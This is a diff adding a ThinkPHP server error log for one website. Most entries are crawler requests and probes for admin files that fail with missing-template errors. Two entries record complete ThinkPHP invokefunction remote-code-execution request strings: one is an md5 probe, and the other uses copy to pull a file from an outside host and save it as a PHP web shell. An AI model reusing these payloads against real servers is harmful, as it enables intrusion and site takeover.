@@ -1,0 +1,40 @@
+---------------------------------------------------------------
+
+[2022-09-14T05:20:37+08:00] 45.131.177.247 GET tool.ruyo.net/?s=/Home/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/Home.html
+---------------------------------------------------------------
+
+[2022-09-14T06:49:41+08:00] 118.140.35.53 GET tool.ruyo.net/?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://tongyong888.xyz/cmd.txt&vars%5B1%5D%5B%5D=roeter.php
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/Index.html
+---------------------------------------------------------------
+
+[2022-09-14T12:09:57+08:00] 157.55.39.125 GET tool.ruyo.net/sitemap.xml
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap.html
+---------------------------------------------------------------
+
+[2022-09-14T12:28:18+08:00] 207.46.13.166 GET tool.ruyo.net/atom.xml
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/atom.html
+---------------------------------------------------------------
+
+[2022-09-14T12:58:16+08:00] 207.46.13.170 GET tool.ruyo.net/sitemap_index.xml
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap_index.html
+---------------------------------------------------------------
+
+[2022-09-14T13:22:58+08:00] 157.55.39.126 GET tool.ruyo.net/sitemap.txt
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap.html
+---------------------------------------------------------------
+
+[2022-09-14T13:48:36+08:00] 157.55.39.126 GET tool.ruyo.net/sitemaps.xml
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemaps.html
+---------------------------------------------------------------
+
+[2022-09-14T13:53:42+08:00] 157.55.39.126 GET tool.ruyo.net/sitemap.xml.gz
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap.html
+---------------------------------------------------------------
+
+[2022-09-14T18:59:25+08:00] 103.104.103.194 GET tool.ruyo.net/data/admin/allowurl.txt
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/data.html
+---------------------------------------------------------------
+
+[2022-09-14T21:21:47+08:00] 103.104.103.194 GET tool.ruyo.net/data/admin/allowurl.txt
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/data.html
